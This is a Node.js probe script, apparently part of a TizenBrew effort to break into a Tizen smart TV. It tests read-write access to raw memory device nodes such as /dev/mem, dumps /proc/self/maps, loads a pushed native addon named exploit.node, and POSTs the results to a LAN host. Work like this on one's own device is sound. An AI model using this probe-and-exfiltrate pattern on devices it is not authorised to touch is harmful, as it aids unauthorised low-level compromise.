// v8 - Node.js v4 compat (no for...of, no arrow funcs in for, no const in loops)
// Goals: confirm /dev/ntksys exists, get maps, try require of pushed .node addon
try {
  var fs = require('fs');
  var http = require('http');
  var lines = ['=== TizenBrew probe v8 (Node.js v4 compat) ==='];
  var devs = ['/dev/ntksys', '/dev/ntkhdma', '/dev/sdp_mem', '/dev/mem'];
  var i, dev, fd;

  for (i = 0; i < devs.length; i++) {
    dev = devs[i];
    try {
      fd = fs.openSync(dev, 'r+');
      lines.push(dev + ': EXISTS fd=' + fd);
      fs.closeSync(fd);
    } catch(e) {
      lines.push(dev + ': ' + String(e.message).slice(0, 60));
    }
  }

  // /proc/self/maps first 3KB
  try {
    var maps = fs.readFileSync('/proc/self/maps', 'utf8');
    lines.push('/proc/self/maps (3KB):\n' + maps.slice(0, 3000));
  } catch(e) { lines.push('maps: ' + e.message); }

  // Try loading a pushed .node addon if present
  var addonPath = '/home/owner/share/tmp/sdk_tools/exploit.node';
  try {
    var addonStat = fs.statSync(addonPath);
    lines.push('exploit.node: found (' + addonStat.size + ' bytes)');
    var addon = require(addonPath);
    lines.push('exploit.node: loaded! exports=' + JSON.stringify(Object.keys(addon)));
  } catch(e) {
    lines.push('exploit.node: ' + String(e.message).slice(0, 80));
  }

  var body = lines.join('\n') + '\n=== DONE ===\n';
  try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe8.txt', body); } catch(e) {}

  var req = http.request({
    hostname: '192.168.0.241', port: 8080, path: '/', method: 'POST',
    headers: { 'Content-Length': Buffer.byteLength(body), 'Content-Type': 'text/plain' }
  }, function(res) { res.resume(); });
  req.on('error', function(e) {
    try { fs.appendFileSync('/home/owner/share/tmp/sdk_tools/tbprobe8.txt', '\nHTTP_ERR: ' + e.message); } catch(e2) {}
  });
  req.write(body);
  req.end();

  setInterval(function() {}, 60000);

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe8-crash.txt', String(e.stack || e.message)); } catch(e2) {}
}
